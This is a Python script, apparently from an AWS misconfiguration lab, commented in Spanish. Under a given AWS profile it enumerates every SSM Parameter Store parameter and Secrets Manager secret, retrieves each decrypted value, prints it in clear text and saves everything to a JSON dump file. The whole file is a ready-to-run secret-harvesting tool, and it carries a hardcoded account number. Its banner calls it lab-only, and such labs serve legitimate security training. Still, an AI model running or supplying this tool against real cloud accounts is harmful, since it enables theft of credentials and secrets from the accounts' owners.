#!/usr/bin/env python3
"""
secret_dumper.py
Extrae todos los secrets de SSM Parameter Store y Secrets Manager.

Uso:
    python3 secret_dumper.py --profile lambda-role
    python3 secret_dumper.py --profile lambda-role --output secrets_dump.json
"""

import argparse
import json
import subprocess
import sys
from datetime import datetime, timezone


def banner():
    print("""
\033[91m
  ██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗
  ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
  ██║  ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
  ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
\033[0m
  \033[93maws-misconfig-lab\033[0m — SSM + Secrets Manager Dumper
  \033[90mSolo para uso en entornos de laboratorio controlados\033[0m
""")


def aws_cli(cmd: list, profile: str) -> dict | None:
    """Ejecuta un comando AWS CLI y retorna el JSON."""
    full_cmd = cmd + ["--profile", profile, "--output", "json"]
    result = subprocess.run(full_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  \033[91m[!] Error: {result.stderr.strip()}\033[0m")
        return None
    return json.loads(result.stdout)


def dump_ssm(profile: str, region: str) -> list:
    """Extrae todos los parámetros SSM con decryption."""
    print(f"\n\033[94m[1] Dumping SSM Parameter Store...\033[0m")

    # Listar todos los parámetros
    data = aws_cli([
        "aws", "ssm", "describe-parameters",
        "--region", region,
    ], profile)

    if not data or not data.get("Parameters"):
        print("  \033[93m[~] Sin parámetros SSM o acceso denegado\033[0m")
        return []

    params = data["Parameters"]
    print(f"  \033[92m[+] {len(params)} parámetro(s) encontrado(s)\033[0m")

    results = []
    for param in params:
        name = param["Name"]
        print(f"  [*] Extrayendo {name}...")

        value_data = aws_cli([
            "aws", "ssm", "get-parameter",
            "--name", name,
            "--with-decryption",
            "--region", region,
        ], profile)

        if value_data:
            value = value_data["Parameter"]["Value"]
            print(f"      \033[92m→ {value}\033[0m")
            results.append({
                "source"  : "SSM",
                "name"    : name,
                "type"    : param.get("Type"),
                "value"   : value,
                "arn"     : param.get("ARN"),
            })
        else:
            results.append({
                "source": "SSM",
                "name"  : name,
                "value" : "ACCESS_DENIED",
            })

    return results


def dump_secrets_manager(profile: str, region: str) -> list:
    """Extrae todos los secrets de Secrets Manager."""
    print(f"\n\033[94m[2] Dumping Secrets Manager...\033[0m")

    data = aws_cli([
        "aws", "secretsmanager", "list-secrets",
        "--region", region,
    ], profile)

    if not data or not data.get("SecretList"):
        print("  \033[93m[~] Sin secrets o acceso denegado\033[0m")
        return []

    secrets = data["SecretList"]
    print(f"  \033[92m[+] {len(secrets)} secret(s) encontrado(s)\033[0m")

    results = []
    for secret in secrets:
        name = secret["Name"]
        arn  = secret["ARN"]
        print(f"  [*] Extrayendo {name}...")

        value_data = aws_cli([
            "aws", "secretsmanager", "get-secret-value",
            "--secret-id", name,
            "--region", region,
        ], profile)

        if value_data:
            raw = value_data.get("SecretString", value_data.get("SecretBinary", ""))
            # Intentar parsear como JSON
            try:
                parsed = json.loads(raw)
                print(f"      \033[92m→ {json.dumps(parsed, indent=8)}\033[0m")
            except Exception:
                parsed = raw
                print(f"      \033[92m→ {raw}\033[0m")

            results.append({
                "source" : "SecretsManager",
                "name"   : name,
                "arn"    : arn,
                "value"  : parsed,
            })
        else:
            results.append({
                "source": "SecretsManager",
                "name"  : name,
                "value" : "ACCESS_DENIED",
            })

    return results


def print_summary(all_secrets: list):
    """Imprime resumen de todos los secrets encontrados."""
    print(f"\n\033[93m{'='*60}\033[0m")
    print(f"\033[93m  RESUMEN — {len(all_secrets)} secret(s) extraído(s)\033[0m")
    print(f"\033[93m{'='*60}\033[0m")

    for s in all_secrets:
        status = "\033[91mACCESS_DENIED\033[0m" if s["value"] == "ACCESS_DENIED" else "\033[92mEXTRAÍDO\033[0m"
        print(f"  [{s['source']:15}] {s['name']:35} {status}")


def save_output(all_secrets: list, output_file: str):
    """Guarda los secrets en un archivo JSON."""
    dump = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "lab"      : "aws-misconfig-lab",
        "account"  : "351668480234",
        "secrets"  : all_secrets,
    }
    with open(output_file, "w") as f:
        json.dump(dump, f, indent=2)
    print(f"\n  \033[92m[+] Output guardado en {output_file}\033[0m")


def parse_args():
    parser = argparse.ArgumentParser(description="SSM + Secrets Manager Dumper")
    parser.add_argument("--profile", default="lambda-role",
                        help="Perfil AWS a usar (default: lambda-role)")
    parser.add_argument("--region",  default="us-east-1",
                        help="Region AWS (default: us-east-1)")
    parser.add_argument("--output",  default=None,
                        help="Archivo JSON de output (opcional)")
    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    print(f"\033[93m[~] Iniciando dump — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}\033[0m")
    print(f"    Perfil : {args.profile}")
    print(f"    Region : {args.region}")

    ssm_secrets = dump_ssm(args.profile, args.region)
    sm_secrets  = dump_secrets_manager(args.profile, args.region)

    all_secrets = ssm_secrets + sm_secrets
    print_summary(all_secrets)

    if args.output:
        save_output(all_secrets, args.output)
    else:
        # Guardar siempre con timestamp
        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        save_output(all_secrets, f"secrets_dump_{ts}.json")

    print(f"\n\033[92m[✓] Dump completo\033[0m\n")


if __name__ == "__main__":
    main()
